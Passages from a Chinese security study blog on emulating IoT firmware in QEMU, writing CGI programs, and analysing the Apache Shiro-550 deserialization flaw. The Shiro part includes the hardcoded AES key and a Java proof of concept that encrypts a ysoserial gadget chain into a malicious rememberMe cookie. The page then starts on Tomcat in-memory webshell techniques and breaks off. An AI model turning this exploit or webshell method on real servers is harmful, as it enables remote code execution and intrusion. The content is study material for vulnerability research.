<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></div></figure></li>
<li><p>启动之后，在<code>qemu</code>中设置相关<code>IP</code>地址，然后启用</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr add 192.168.2.129/24 dev eth0</span><br><span class="line">ip link <span class="built_in">set</span> eth0 up</span><br></pre></td></tr></table></div></figure>

<p>这样就可以有<code>IP</code>地址了，当然这些<code>IP</code>地址都是自己设置的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202191218116.png" alt="image-20221202191218116"></p>
<p>这样就宿主机和<code>qemu</code>虚拟机就可以连通了，之后就是相关的服务启动了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202191300164.png" alt="image-20221202191300164"></p>
</li>
</ul>

        <h2 id="3-常见配置"   >
          <a href="#3-常见配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-常见配置" class="headerlink" title="3.常见配置"></a>3.常见配置</h2>
      <p>很多的<code>IOT</code>都是<code>squashfs</code>这个文件系统，<code>binwalk</code>解包出来会有一个<code>squashfs-root</code>文件夹，然后我们可以将该文件系统通过<code>scp</code>拷贝进启动的<code>qemu</code>虚拟机，之后进行简单的设置即可</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@ip:/root/</span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载系统的proc固件目录下的proc,防止程序在访问内核信息时找不到相关的而运行错误</span></span><br><span class="line">mount --<span class="built_in">bind</span> /proc squashfs-root/proc</span><br><span class="line"></span><br><span class="line"><span class="comment">#更换一下root目录,为文件系统的相关链接库做准备</span></span><br><span class="line">chroot . bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后还需要改一下软连接、软路由啥的,比如DIR-645的漏洞,就需要创建一些软连接,如下</span></span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动服务就行</span></span><br><span class="line">/usr/bin/httpd -f http_conf</span><br></pre></td></tr></table></div></figure>




        <h1 id="三、CGI配置"   >
          <a href="#三、CGI配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CGI配置" class="headerlink" title="三、CGI配置"></a>三、CGI配置</h1>
      <p>很多时候的嵌入式<code>Web</code>页面都是用<code>CGI</code>的，所以可以稍微学习一下相关<code>CGI</code>。</p>

        <h2 id="1-环境搭建"   >
          <a href="#1-环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2>
      <p>这里就选择<code>ubuntu</code>自带的<code>mini-httpd</code>服务</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mini-httpd</span><br></pre></td></tr></table></div></figure>

<p>然后相关的配置在<code>/etc/mini-httpd.conf</code>，主要关注如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207103833732.png" alt="image-20221207103833732"></p>
<p>相关端口也是设置好</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207103738798.png" alt="image-20221207103738798"></p>
<p>然后需要在数据目录，即<code>/var/www/html</code>下新建<code>cgi-bin</code>目录，然后把相关<code>CGI</code>程序放到该<code>cgi-bin</code>目录下即可。</p>

        <h2 id="2-启动服务"   >
          <a href="#2-启动服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-启动服务" class="headerlink" title="2.启动服务"></a>2.启动服务</h2>
      <p>如下，设置一下启动配置文件即可运行了</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mini_httpd -C /etc/mini-httpd.conf</span><br></pre></td></tr></table></div></figure>

<p>然后即可访问到默认界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104046784.png" alt="image-20221207104046784"></p>

        <h2 id="3-编写CGI"   >
          <a href="#3-编写CGI" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-编写CGI" class="headerlink" title="3.编写CGI"></a>3.编写<code>CGI</code></h2>
      <p><code>CGI</code>和正常<code>C</code>程序是一样的，直接编译之后放到对应<code>cgi-bin</code>目录下即可，比如如下程序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104240311.png" alt="image-20221207104240311"></p>
<p>编译如下</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ./test.c -static -o test.cgi</span><br></pre></td></tr></table></div></figure>

<p>访问效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104257725.png" alt="image-20221207104257725"></p>
<p>这里需要注意要直接<code>printf</code>显示出来的话，需要设置相关的<code>html</code>格式，这里即可先进行了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;Content-Type: text/plain\r\n\r\n&quot;</span> );</span><br></pre></td></tr></table></div></figure>

<p>之后即可自己写一些<code>CGI</code>来玩耍了。</p>
<p>感觉<code>CGI</code>的很多的不安全性就是在于直接运行了一个可执行程序，而该可执行程序大多都是用<code>C</code>语言编写的，安全性可想而知。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/10/22/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">WEB中间件漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-10-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Shiro"   >
          <a href="#Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1>
      
        <h2 id="1-Shiro-550"   >
          <a href="#1-Shiro-550" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Shiro-550" class="headerlink" title="1.Shiro-550"></a>1.Shiro-550</h2>
      <p>对应<code>CVE-2016-4437</code></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#823652d0" >Shiro 550 漏洞学习（一） (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-利用版本"   >
          <a href="#1-利用版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用版本" class="headerlink" title="(1)利用版本"></a>(1)利用版本</h3>
      <p><code>1.2.4</code>及以下</p>

        <h3 id="2-漏洞原理"   >
          <a href="#2-漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞原理" class="headerlink" title="(2)漏洞原理"></a>(2)漏洞原理</h3>
      <p><code>Apache Shiro</code>框架提供了记住密码功能，登录成功的话会将用户的登录信息进行经过<code>AES</code>加密然后<code>base64</code>编码，放在<code>Cookie</code>的<code>rememberMe</code>字段，大致如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122090810999.png" alt="image-20221122090810999"></p>
<p>那么在服务端就会对该<code>rememberMe</code>字段进行<code>base64</code>解码，然后<code>AES</code>解密，最后再反序列化，如果我们构造恶意的<code>rememberMe</code>字段，这样就会导致反序列化的<code>RCE</code>漏洞。同时，由于<code>AES</code>加解密的<code>KEY</code>是硬编码写在源码中的，我们可以直接获得。</p>

        <h3 id="3-漏洞环境"   >
          <a href="#3-漏洞环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-漏洞环境" class="headerlink" title="(3)漏洞环境"></a>(3)漏洞环境</h3>
      
        <h4 id="简单搭建"   >
          <a href="#简单搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单搭建" class="headerlink" title="简单搭建"></a>简单搭建</h4>
      <ul>
<li><code>vulhub</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub" >vulhub/vulhub: Pre-Built Vulnerable Environments Based on Docker-Compose (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
</ul>

        <h4 id="源码构建Shiro"   >
          <a href="#源码构建Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码构建Shiro" class="headerlink" title="源码构建Shiro"></a>源码构建<code>Shiro</code></h4>
      <p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46127592/article/details/123999749" >(48条消息) shiro debug 调试_scanner010的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p>下载源码：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/apache/shiro" >apache/shiro: Apache Shiro (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后换成<code>1.2.4</code>：<code>git checkout shiro-root-1.2.4</code></p>
</li>
<li><p><code>jstl</code>版本切换</p>
<p>打开<code>shiro/samples/web/pom.xml</code>，更换<code>jstl</code>版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092207371.png" alt="image-20221122092207371"></p>
<p>之后重新<code>reload</code>一下即可</p>
</li>
<li><p><code>Tomcat</code>部署</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092453428.png" alt="image-20221122092453428"></p>
<p>然后配置一下<code>Web</code>界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092527995.png" alt="image-20221122092527995"></p>
<p>如下添加即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092557904.png" alt="image-20221122092557904"></p>
<p>之后运行或调试即可</p>
</li>
</ul>

        <h3 id="4-漏洞流程分析"   >
          <a href="#4-漏洞流程分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-漏洞流程分析" class="headerlink" title="(4)漏洞流程分析"></a>(4)漏洞流程分析</h3>
      <p><code>rememberMe</code>解析流程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AbstractRememberMeManager.getRememberedPrincipals</span><br><span class="line">CookieRememberMeManager.getRememberedSerializedIdentity  //获取Cookie中的remember字段,并且进行base64解码</span><br><span class="line"></span><br><span class="line">AbstractRememberMeManager.convertBytesToPrincipals</span><br><span class="line">AbstractRememberMeManager.decrypt</span><br><span class="line">AbstractRememberMeManager.deserialize</span><br><span class="line"></span><br><span class="line">DefaultSerializer.deserialize</span><br></pre></td></tr></table></div></figure>

<p>大致图解如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122114903998.png" alt="image-20221122114903998"></p>

        <h3 id="5-漏洞代码分析"   >
          <a href="#5-漏洞代码分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-漏洞代码分析" class="headerlink" title="(5)漏洞代码分析"></a>(5)漏洞代码分析</h3>
      <ul>
<li><p><code>AbstractRememberMeManager.getRememberedPrincipals</code></p>
<p>当一个涉及到用户信息的请求来时，首先是进入<code>rememberMe</code>管理函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122115116077.png" alt="image-20221122115116077"></p>
</li>
<li><p><code>CookieRememberMeManager.getRememberedSerializedIdentity</code></p>
<p>在<code>AbstractRememberMeManager.getRememberedPrincipals</code>函数中调用<code>getRememberedSerializedIdentity</code>尝试获取<code>base64</code>解码后的<code>rememberMe</code>字段</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120445903.png" alt="image-20221122120445903"></p>
</li>
<li><p><code>AbstractRememberMeManager.convertBytesToPrincipals</code></p>
<p>随即调用<code>convertBytesToPrincipals</code>函数进行后续操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120543984.png" alt="image-20221122120543984"></p>
<ul>
<li><p><code>AbstractRememberMeManager.decrypt</code></p>
<p><code>convertBytesToPrincipals</code>函数中调用到<code>decrypt</code>函数，通过<code>getDecryptionCipherKey</code>获取密钥尝试对<code>base64</code>解码后的<code>Cookie</code>进行<code>AES</code>解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120725908.png" alt="image-20221122120725908"></p>
<p>一层一层撸下来，如下所示，可以在<code>AbstractRememberMeManager</code>中找到对应的硬编码的<code>key</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getDecryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDecryptionCipherKey</span><span class="params">(<span class="keyword">byte</span>[] decryptionCipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCipherKey</span><span class="params">(<span class="keyword">byte</span>[] cipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.serializer = <span class="keyword">new</span> DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="keyword">this</span>.cipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>AbstractRememberMeManager.deserialize</code></p>
<p>解密完成之后，回到<code>AbstractRememberMeManager.convertBytesToPrincipals</code>函数中即进行反序列化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122121659679.png" alt="image-20221122121659679"></p>
<p>调用到了<code>DefaultSerializer.deserialize</code>来完成最后的反序列化过程</p>
</li>
</ul>
</li>
</ul>

        <h3 id="6-漏洞利用"   >
          <a href="#6-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-漏洞利用" class="headerlink" title="(6)漏洞利用"></a>(6)漏洞利用</h3>
      <p>即将我们的恶意反序列化链进行相关编码加密，在登录时勾选<code>rememberMe</code>，然后抓包设置为<code>rememberMe</code>字段发送到服务器即可，常用的链条为<code>CC1</code>，<code>CC6</code>，<code>CC10</code>，<code>cc11</code></p>
<ul>
<li><p>相关<code>POC</code></p>
<p>使用<code>ysoserial</code>生成序列化链条<code>cc1</code>然后编码加密即可。</p>
</li>
</ul>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shiroDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/JavaThings/cc11&quot;</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h3 id="7-漏洞检测"   >
          <a href="#7-漏洞检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-漏洞检测" class="headerlink" title="(7)漏洞检测"></a>(7)漏洞检测</h3>
      <ul>
<li><p><code>dnslog</code></p>
</li>
<li><p><code>key</code>检测</p>
<p><code>key</code>正确则显示<code>deleteMe</code>，反之则显示<code>deleteMe</code></p>
</li>
</ul>

        <h3 id="8-漏洞修复"   >
          <a href="#8-漏洞修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-漏洞修复" class="headerlink" title="(8)漏洞修复"></a>(8)漏洞修复</h3>
      <p>官方修复是<code>key</code>的随机生成</p>

        <h2 id="2-Shiro-721"   >
          <a href="#2-Shiro-721" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Shiro-721" class="headerlink" title="2.Shiro-721"></a>2.Shiro-721</h2>
      <p>这个就先不复现了，比较没有实用价值</p>

        <h1 id="Tomcat"   >
          <a href="#Tomcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1>
      
        <h2 id="1-内存马"   >
          <a href="#1-内存马" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-内存马" class="headerlink" title="1.内存马"></a>1.内存马</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na#74f91dcf" >Tomcat 内存马学习(一)：Filter型 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这个不能算漏洞，只能算一种写木马的方式吧</p>
<p>由于<code>Tomcat</code>的机制问题，存在很多可以写内存马的地方，依据[wjlshare师傅博客](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>)介绍主要有如下几种</p>
<ul>
<li><p>servlet-api类</p>
</li>
<li><ul>
<li>filter型</li>
</ul>
</li>
<li><ul>
<li>servlet型</li>
</ul>
</li>
<li><p>spring类</p>
</li>
<li><ul>
<li>拦截器</li>
</ul>
</li>
<li><ul>
<li>controller型</li>
</ul>
</li>
<li><p>Java Instrumentation类</p>
</li>
<li><ul>
<li>agent型</li>
</ul>
</li>
</ul>

        <h3 id="servlet-api类"   >
          <a href="#servlet-api类" class="heading-link"><i class="fas fa-link"></i></a><a href="#servlet-api类" class="headerlink" title="servlet-api类"></a>servlet-api类</h3>
      <p>先需要探讨一下该机制，大概流程如下</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://paper.seebug.org/1441/#1jsp-webshell" >中间件内存马注入&amp;冰蝎连接 (seebug.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122181418299.png" alt="image-20221122181418299"></p>
<p>然后简单构建一下环境</p>
<ul>
<li>创建项目</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122174929458.png" alt="image-20221122174929458"></p>
<ul>
<li><p>添加一下<code>Web</code>框架</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175006785.png" alt="image-20221122175006785"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175139870.png"></p>
</li>
<li><p>导入对应<code>Tomcat</code>的<code>servlet-api</code>依赖</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175223681.png" alt="image-20221122175223681"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175306009.png" alt="image-20221122175306009"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175623013.png" alt="image-20221122175623013"></p>
</li>
<li><p>然后就可以创建<code>Servlet-Filter</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175715777.png" alt="image-20221122175715777"></p>
</li>
<li><p>创建之后需要在<code>web/WEB-INF/web.xml</code>中加入创建的<code>filter</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175937704.png" alt="image-20221122175937704"></p>
<p>这里设置了<code>url-pattern</code>为<code>/*</code>，表示所有的<code>url</code>都会经过该<code>filter</code></p>
</li>
<li><p>然后配置一下<code>Tomcat</code>服务器即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180133583.png" alt="image-20221122180133583"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180208208.png" alt="image-20221122180208208"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180232020.png" alt="image-20221122180232020"></p>
</li>
<li><p>相关代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180706555.png" alt="image-20221122180706555"></p>
<ul>
<li><p><code>Servlet</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Servlet&quot;, value = &quot;/Servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;MyServlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>MyFilter</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;MyFilter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;MyFilter&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p>运行起来即可看到</p>
<p>任意存在的<code>URL</code>访问都会执行设置的<code>MyFilter</code>，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180751396.png" alt="image-20221122180751396"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180802377.png" alt="image-20221122180802377"></p>
</li>
</ul>
<p>当然一般是给对应的<code>Servlet</code>来对应的<code>filter</code>，修改一下<code>web.xml</code>里的<code>url-pattern</code>即可</p>

        <h4 id="①机制流程"   >
          <a href="#①机制流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#①机制流程" class="headerlink" title="①机制流程"></a>①机制流程</h4>
      
        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      <ul>
